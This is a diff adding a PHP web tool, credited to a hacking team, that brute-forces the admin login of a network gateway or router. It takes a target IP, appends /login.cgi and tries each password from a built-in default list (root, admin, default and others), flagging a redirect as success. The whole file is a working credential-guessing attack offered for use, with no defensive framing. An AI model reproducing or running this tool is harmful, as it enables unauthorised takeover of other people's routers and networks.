@@ -1,0 +1,180 @@
+<?php
+ 
+//Author : MrZhu404
+//Team : GresiXploiter
+//Since 2019
+//Recode Fikss Luh Kontl_-
+ 
+set_time_limit(0);
+error_reporting(0);
+ 
+class MrZhu{
+ 
+        private $host;
+        private $user;
+        private $open;
+        private $passwordnya;
+ 
+  public function banner() {
+   echo("
+    <html>
+    <head>
+    <title>IP-Gateway Brute</title>
+    <link href=\"https://fonts.googleapis.com/css?family=Oxanium|Trade+Winds|Graduate|Joti+One|Rajdhani|Viaoda+Libre&display=swap\" rel=\"stylesheet\">
+    <meta name=\"viewport\" content=\"width=1000, user-scalable=no\">
+    <meta name=\"theme-color\" content=\"red\">
+    <script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
+    <style type='text/css'>
+    body{
+        background-image: url(https://wallpaperaccess.com/full/336598.jpg);
+      no-repeat  fixed;
+      background-size:100% 100%;
+        font-family:Oxanium;
+        font-size:26px;
+        background-color:#000000;
+        color:white;
+ 
+    }
+    input,select,textarea,table,button {
+background: none repeat scroll 0 0 #000000;
+border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+color: #FFFFFF;
+margin: 0;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+font-family: Oxanium;
+font-size: 17pt;
+}
+input[type=text]{
+  width: 550px;
+  height: 40px;
+  font-size: 17pt;
+  color: white;
+  border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+  font-family: Oxanium;
+  box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+}
+input[type=submit]{
+border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+color: white; 
+margin: 5px;
+padding: 5px;
+width:250px;
+font-family: Oxanium;
+}
+textarea{
+resize: none;
+width: 490px;
+height:490px;
+}
+
+input:hover, textarea:hover, select:hover, button:hover {
+background: none repeat scroll 0 0 #220000;
+border: 1px solid #FF0000;
+font-size: 17pt;
+}
+.kotak{
+  background-color: transparent;
+  border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+width: 750px;
+height: 810px;
+
+}
+ h1{
+  color:red;
+  font-family:Trade Winds;
+ }
+ .kotak{
+  background-color:black;
+  width:470px;
+  height:24px;
+  border:red solid;
+  text-align:center;
+ }
+</style>
+</head>
+<body><center><hr>
+<h1><center>Login Admin BruteForce</center></h1><hr>
+<marquee scrollamount=\"4\" direction=\"left\" width=\"700px\" height='33px' style=\"border: 3px red solid;box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;\"><font color=\"white\" face=\"Trade Winds\" size=\"5\" ><b>[<font color=\"red\">+</font>] Ini adalah tools bruteforce admin login gateway | by MrZhu404 [<font color=\"red\">+</font>]</font></marquee><br>
+<form action='' method='POST'>
+<center><br><font color='red'>[</font><font color='white'>+</font><font color='red'>] </font><font color='white'>Masukan Ip Gateway </font><font color='red'>[</font><font color='white'>+</font><font color='red'>]</font></center><br>
+<input type='text' name='host' placeholder='192.168.1.1'><br><br>
+<center><font color='red'>[</font><font color='white'>+</font><font color='red'>] </font><font color='white'>Masukan Password </font><font color='red'>[</font><font color='white'>+</font><font color='red'>]</font><font color='grey'></center><br>
+<center>
+<textarea name='passwordnya'>
+root
+theworldinyourhand
+support
+password
+default
+admin</textarea><br><br><center><br>
+<center><input type='Submit' value='KLIK ME'><br><br></center>
+</form>
+</body></center>
+</html>");
+}
+ 
+    public function extract_post() {
+         $this->host = $_POST["host"];
+         $this->user = $_POST["user"];
+         $this->open = $_POST["passwordnya"];
+       }
+ 
+       public function Xregex() {
+         if(preg_match("@/login.cgi@", $this->host)) {
+             return true;
+         } else {
+            $this->host = $_POST["host"]."/login.cgi";
+         }
+     }
+ 
+      public function brute() {
+           $passwordnya = array_filter(explode("\n", $this->open));
+           foreach($passwordnya as $this->passwordnya) {
+           for($i=0; $i < count($this->passwordnya); $i++) {
+                        $this->Xcurl();
+                     }
+              }
+       }
+ 
+        private function cool() {
+            echo "<font color='yellow' style='font-size: 15px;'> Url : "."<font color='white'>{$this->host}</font>";
+            echo "<font color='yellow' style='font-size: 15px;'> Pass : "."<font color='white'>{$this->passwordnya}</font>";
+        }
+ 
+        private function Xcurl() {
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $this->host);
+            curl_setopt($curl, CURLOPT_USERAGENT, $this->useragent);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
+            curl_setopt($curl, CURLOPT_POST, true);
+            curl_setopt($curl, CURLOPT_POSTFIELDS, "name=admin&pswd=$this->passwordnya");
+            $exec = curl_exec($curl);
+            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+            $this->cool();
+            if($http == 302) {
+                 echo "<script>swal('OK', 'Passwordnya adalah {$this->passwordnya}', 'success')</script><br><br><div class='kotak'><font color='lime' style='font-size: 15px;'>[<font color='white'>+</font>] <font color='white'>Password ketemu : <font color='lime'>{$this->passwordnya} <font color='lime'>[<font color='white'>+<font color='lime'>]</font></div><br>";
+            } else {
+                echo "<font color='red'>[-] Gagal [-]</font><br>";
+            }
+                curl_close($curl);
+        }
+}
+ 
+$wp = new MrZhu();
+$wp->useragent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10";
+$wp->banner();
+$wp->extract_post();
+$wp->Xregex();
+$wp->brute();
+?>
